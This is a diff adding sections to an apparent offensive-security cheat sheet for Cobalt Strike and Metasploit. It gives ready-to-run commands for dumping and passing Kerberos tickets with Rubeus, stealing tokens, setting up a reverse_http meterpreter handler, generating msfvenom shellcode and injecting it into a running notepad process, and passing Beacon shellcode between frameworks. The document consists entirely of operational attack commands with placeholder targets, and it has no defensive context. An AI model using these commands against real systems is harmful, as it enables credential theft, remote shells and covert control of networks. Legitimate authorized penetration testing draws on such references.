@@ -168,3 +168,46 @@ pth <DOMAIN>\<USER> <NTLM HASH>
 execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
 execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
 ```
+
+#### Extract tickets
+```
+execute-assembly Rubeus.exe triage
+execute-assembly Rubeus.exe dump /service:<SERVICE> /luid:<LUID> /nowrap
+execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
+steal_token 4872
+```
+
+## Session passing
+### Cobalt strike --> Metasploit
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set LHOST eth0
+set LPORT 8080
+exploit -j
+```
+- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port to 8080, Set the name to Metasploit and click Save.
+```
+spawn metasploit
+```
+
+### Cobalt strike --> Metasploit shellcode inside process
+```
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin
+execute C:\Windows\System32\notepad.exe
+ps
+shinject <PID> x64 msf.bin
+```
+
+### Metasploit --> Cobalt strike
+- Go to Attacks --> Packages --> Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
+```
+use post/windows/manage/shellcode_inject
+set SESSION 1
+set SHELLCODE /tmp/beacon.bin
+run
+```
+
+
+
